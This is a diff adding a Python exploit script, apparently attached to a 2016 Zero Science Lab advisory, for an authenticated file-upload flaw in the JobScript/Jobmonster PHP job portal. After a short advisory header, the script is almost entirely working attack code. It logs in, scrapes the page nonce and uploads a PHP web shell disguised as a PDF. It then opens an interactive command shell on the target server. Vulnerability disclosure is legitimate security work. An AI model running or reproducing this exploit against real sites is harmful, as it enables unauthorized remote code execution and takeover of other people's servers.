@@ -1,0 +1,128 @@
+#!C:/Python27/python.exe -u
+#
+#
+# JobScript Remote Code Execution Exploit
+#
+#
+# Vendor: Jobscript
+# Product web page: http://www.jobscript.in
+# Affected version: Unknown
+#
+# Summary: JobScript is inbuilt structured website was developed in PHP and MySQL 
+# database. It's a complete job script for those who wants to start a professional 
+# job portal website like naukri.com, monster.com, clickjobs.com or any such major 
+# job portals. Jobscript was designed and developed with the following features like 
+# control panel for Employer's and also for Job Seeker's, email alerts, job search, 
+# online resume, payment and membership plans. 
+#
+# Desc: JobScript suffers from an authenticated arbitrary PHP code execution. The 
+# vulnerability is caused due to the improper verification of uploaded files in 
+# '/admin-ajax.php' script thru the 'name' and 'file' POST parameters. This can 
+# be exploited to execute arbitrary PHP code by uploading a malicious PHP script 
+# file with '.php' extension (to bypass the '.htaccess' block rule) that will be 
+# stored in '/jobmonster/wp-content/uploads/jobmonster/' directory.
+#
+# Tested on: Apache 2.4.9
+#            PHP 5.4.26
+#
+# Vulnerability discovered by Bikramaditya 'PhoenixX' Guha
+#
+# Zero Science Lab - http://www.zeroscience.mk
+# Macedonian Information Security Research And Development Laboratory
+#
+#
+# Advisory ID: ZSL-2016-5322
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5322.php
+#
+#
+# 31.03.2016
+#
+
+import itertools, mimetools, mimetypes
+import cookielib, urllib, urllib2, sys
+import os, time, re, requests, httplib
+
+from cStringIO import StringIO
+from urllib2 import URLError
+
+global file, file1
+file = ';nonce'
+file1 = '"security"'
+
+host = sys.argv[1]
+
+cj = cookielib.CookieJar()
+opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+
+prelogin = opener2.open('http://'+host+'/jobmonster/member-2/')
+output = prelogin.read()
+
+for line in output.splitlines():
+    if file1 in line:
+             security = str(line.split("=")[4:])[3:13]
+             break
+
+print 'Login please.'
+
+username = raw_input('Enter username: ')
+password = raw_input('Enter password: ')
+
+login_data = urllib.urlencode({
+                            'action' : 'noo_ajax_login',
+                            'log' : username,
+                            'pwd' : password,
+                            'remember' : 'false',
+                            'security' : security,
+                            'redirect_to' : 'http%3A%2F%2Fcscript.in%2Fjobmonster%2Fmember-2%3Fpagename%3Dmember-2%26logged_in%3D1'                            
+                            })
+
+login = opener2.open('http://'+host+'/jobmonster/wp-admin/admin-ajax.php', login_data)
+auth = login.read()
+
+if re.search(r'false', auth):
+    print 'Incorrect username or password'
+    sys.exit()
+else:
+    print 'Authenticated'
+	
+response = opener2.open('http://'+host+'/jobmonster/member-2/?pagename=member-2&logged_in=1')
+response = opener2.open('http://'+host+'/jobmonster/post-a-resume/?action=resume_general')
+output = response.read()
+
+for line in output.splitlines():
+    if file in line:
+            nonce = str(line.split("=")[3:])[28:38]
+
+headers = {'User-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0','Referer':'\'http://'+host+'/jobmonster/post-a-resume/?action=resume_general\'','Accept-Language':'en-US,en;q=0.5','Content-type':'multipart/form-data; boundary=---------------------------51402178812572','Connection':'close','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Encoding':'gzip, deflate','Content-length':'335'}
+
+body = """-----------------------------51402178812572
+Content-Disposition: form-data; name="name"
+
+RCE.php
+-----------------------------51402178812572
+Content-Disposition: form-data; name="file"; filename="RCE.php"
+Content-Type: application/pdf
+
+<?php
+system($_GET['cmd']);
+?>
+
+-----------------------------51402178812572--"""
+
+response = requests.post('http://'+host+'/jobmonster/wp-admin/admin-ajax.php?action=noo_plupload&nonce='+nonce+'', data=body, headers=headers, cookies=cj)
+
+raw_input()
+while True:
+    try:
+        cmd = raw_input('shell@'+host+':~# ')
+        execute = opener2.open('http://'+host+'/jobmonster/wp-content/uploads/jobmonster/RCE.php?cmd='+urllib.quote(cmd))
+        reverse = execute.read()
+        print reverse
+        
+        if cmd.strip() == 'exit':
+            break
+
+    except Exception:
+        break
+
+sys.exit()
